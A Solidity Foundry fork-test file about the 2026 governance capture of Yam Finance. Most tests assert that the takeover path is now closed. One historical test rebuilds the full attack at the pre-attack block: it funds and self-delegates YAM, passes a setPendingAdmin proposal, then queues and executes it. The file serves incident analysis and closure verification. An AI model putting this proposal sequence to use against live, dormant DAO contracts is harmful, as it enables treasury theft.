// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";

/// C-28 dormant-DAO capture — Yam Finance (the 2026-09-12 template incident).
///
/// 2026-09-12: ~504K YAM (3.3%) bought cheaply, self-delegated, proposal #44 executed
/// `setPendingAdmin(attacker)` on the Timelock; attacker accepted admin and drained the
/// legacy UMA farms (~$121K). See DeFiHackLabs 2026-09/YamFinance_exp.sol.
///
/// This test proves the path is CLOSED today at the latest block: the Timelock admin is
/// the attacker EOA, pendingAdmin is zero, and the Governor can no longer queue into the
/// Timelock (queueTransaction requires msg.sender == admin == the attacker EOA).
/// A second test forks at the pre-attack block to show the same path was open then.
///
/// Read-only fork tests; no mainnet transactions.
contract YamClosureTest is Test {
    address constant YAM_GOV = 0x2DA253835967D6E721C6c077157F9c9742934aeA;
    address constant TIMELOCK = 0x8b4f1616751117C38a0f84F9A146cca191ea3EC5;
    address constant YAM = 0x0AaCfbeC6a24756c20D41914F2caba817C0d8521;
    address constant ATTACKER_EOA = 0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982;
    address constant UMA_FARM_MAR = 0xffb607418dBEaB7A888e079A34Be28A30d8E1DE2;
    address constant UMA_FARM_FEB = 0xc0AE1e1e172ECD4C56fD8043FD5Afe5a473E9835;
    address constant YAM_RESERVES2 = 0x97990B693835da58A281636296D2Bf02787DEa17;
    address constant SUSHI_YAM_PAIR = 0x0F82E57804D0B1F6FAb2370A43dcFAd3c7cB239c;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant UMA = 0x04Fa0d235C4abf4BcF4787aF4CF447DE572eF828;

    uint256 constant PRE_ATTACK_BLOCK = 25_884_984; // 2026-09-12, before self-delegation

    function _rpc() internal view returns (string memory) {
        return vm.envOr("FORK_RPC_URL", vm.envOr("RPC_URL", string("https://ethereum-rpc.publicnode.com")));
    }

    function _archiveRpc() internal view returns (string memory) {
        if (vm.exists("ci-out/rpc_eth_archive.txt")) {
            string memory s = vm.trim(vm.readFile("ci-out/rpc_eth_archive.txt"));
            if (bytes(s).length > 8 && keccak256(bytes(s)) != keccak256(bytes("NONE"))) return s;
        }
        return "";
    }

    /// Fund a fresh attacker with 504,427 YAM by transferring from the YAM reserves contract
    /// (a real on-chain holder; `deal` does not work on the YAM delegator's storage).
    function _fundYam(address attacker) internal {
        vm.prank(YAM_RESERVES2);
        IERC20(YAM).transfer(attacker, 504_427e18);
    }

    function _proposalFor(address attacker) internal returns (uint256 id) {
        address[] memory targets = new address[](1);
        uint256[] memory values = new uint256[](1);
        string[] memory sigs = new string[](1);
        bytes[] memory datas = new bytes[](1);
        targets[0] = TIMELOCK;
        sigs[0] = "setPendingAdmin(address)";
        datas[0] = abi.encode(attacker);
        vm.startPrank(attacker);
        vm.roll(block.number + 2); // make the delegation checkpoint strictly prior
        id = IYamGovernor(YAM_GOV).propose(targets, values, sigs, datas, "fork: re-run C-28 template");
        vm.roll(block.number + 2); // past votingDelay -> Active
        IYamGovernor(YAM_GOV).castVote(id, true);
        vm.roll(block.number + IYamGovernor(YAM_GOV).votingPeriod() + 1);
        vm.stopPrank();
    }

    /// @notice Current live state: Timelock captured by the 2026-09 attacker EOA; path closed.
    function test_live_state_captured_by_previous_attacker() public {
        vm.createSelectFork(_rpc());

        assertEq(IYamTimelock(TIMELOCK).admin(), ATTACKER_EOA, "admin is the 2026-09 attacker EOA");
        assertEq(IYamTimelock(TIMELOCK).pendingAdmin(), address(0), "no pending admin to displace");
        assertEq(IYamTimelock(TIMELOCK).delay(), 43200, "delay reduced to 12h by attacker");
        assertEq(IYamGovernor(YAM_GOV).timelock(), TIMELOCK, "governor still points at timelock");

        // farms are drained and now governed by the attacker
        assertEq(IFarm(UMA_FARM_MAR).gov(), ATTACKER_EOA, "MAR farm gov = attacker");
        assertEq(IFarm(UMA_FARM_FEB).gov(), ATTACKER_EOA, "FEB farm gov = attacker");
        assertEq(IERC20(WETH).balanceOf(UMA_FARM_MAR), 0, "MAR WETH drained");
        assertEq(IERC20(UMA).balanceOf(UMA_FARM_MAR), 0, "MAR UMA drained");
        assertEq(IERC20(WETH).balanceOf(UMA_FARM_FEB), 0, "FEB WETH drained");

        // other Yam governance surfaces are also captured
        assertEq(IFarm(YAM_RESERVES2).gov(), ATTACKER_EOA, "YAMReserves2 gov = attacker");
        assertEq(IYamToken(YAM).gov(), ATTACKER_EOA, "YAM token gov = attacker");

        emit log_named_uint("Yam governor proposalCount", IYamGovernor(YAM_GOV).proposalCount());
        emit log_named_decimal_uint("timelock UMA balance", IERC20(UMA).balanceOf(TIMELOCK), 18);
        emit log_named_decimal_uint("YAMReserves2 YAM (attacker-controlled)", IERC20(YAM).balanceOf(YAM_RESERVES2), 18);
    }

    /// @notice A fresh attacker with 504K YAM delegated can still pass a proposal, but queueing it reverts.
    function test_governance_replay_queue_reverts() public {
        vm.createSelectFork(_rpc());
        address attacker = makeAddr("yamAttacker");

        _fundYam(attacker);
        vm.prank(attacker);
        IYamToken(YAM).delegate(attacker);
        vm.roll(block.number + 2);
        assertGt(IYamToken(YAM).getPriorVotes(attacker, block.number - 1), IYamGovernor(YAM_GOV).proposalThreshold(), "above threshold");

        uint256 id = _proposalFor(attacker);
        assertEq(IYamGovernor(YAM_GOV).state(id), 4, "proposal Succeeded (quorum passed)");

        // The kill switch: the timelock requires msg.sender == admin (the captured EOA), not the governor.
        vm.expectRevert(bytes("Timelock::queueTransaction: Call must come from admin."));
        IYamGovernor(YAM_GOV).queue(id);
    }

    /// @notice Direct takeover attempts revert.
    function test_direct_takeover_reverts() public {
        vm.createSelectFork(_rpc());
        address attacker = makeAddr("yamAttackerDirect");
        vm.startPrank(attacker);
        vm.expectRevert(bytes("Timelock::setPendingAdmin: Call must come from Timelock."));
        IYamTimelock(TIMELOCK).setPendingAdmin(attacker);
        vm.expectRevert(bytes("Timelock::acceptAdmin: Call must come from pendingAdmin."));
        IYamTimelock(TIMELOCK).acceptAdmin();
        vm.stopPrank();
    }

    /// @notice At the pre-attack block the same proposal path was open (template reconstruction).
    ///         Requires an archive RPC (probed by ci/run.sh into ci-out/rpc_eth_archive.txt).
    function test_historical_path_was_open() public {
        string memory archive = _archiveRpc();
        if (bytes(archive).length == 0) {
            vm.skip(true, "no archive RPC available; historical replay skipped");
            return;
        }
        vm.createSelectFork(archive, PRE_ATTACK_BLOCK);
        address attacker = makeAddr("preAttackAttacker");

        assertEq(IYamTimelock(TIMELOCK).admin(), YAM_GOV, "pre-attack admin was the governor");
        _fundYam(attacker);
        vm.prank(attacker);
        IYamToken(YAM).delegate(attacker);

        uint256 id = _proposalFor(attacker);
        assertEq(IYamGovernor(YAM_GOV).state(id), 4, "proposal Succeeded");

        vm.prank(attacker);
        IYamGovernor(YAM_GOV).queue(id); // succeeds pre-attack
        vm.warp(block.timestamp + IYamTimelock(TIMELOCK).delay() + 1);
        vm.prank(attacker);
        IYamGovernor(YAM_GOV).execute(id);
        assertEq(IYamTimelock(TIMELOCK).pendingAdmin(), attacker, "attacker became pendingAdmin pre-attack");
        emit log_named_uint("pre-attack proposal id", id);
    }
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IYamToken is IERC20 {
    function delegate(address) external;
    function getPriorVotes(address, uint256) external view returns (uint256);
    function gov() external view returns (address);
}

interface IYamGovernor {
    function proposalCount() external view returns (uint256);
    function proposalThreshold() external view returns (uint256);
    function quorumVotes() external view returns (uint256);
    function votingPeriod() external view returns (uint256);
    function timelock() external view returns (address);
    function propose(
        address[] calldata,
        uint256[] calldata,
        string[] calldata,
        bytes[] calldata,
        string calldata
    ) external returns (uint256);
    function castVote(uint256, bool) external;
    function queue(uint256) external;
    function execute(uint256) external;
    function state(uint256) external view returns (uint8);
}

interface IYamTimelock {
    function admin() external view returns (address);
    function pendingAdmin() external view returns (address);
    function delay() external view returns (uint256);
    function setPendingAdmin(address) external;
    function acceptAdmin() external;
}

interface IFarm {
    function gov() external view returns (address);
    function pendingGov() external view returns (address);
}
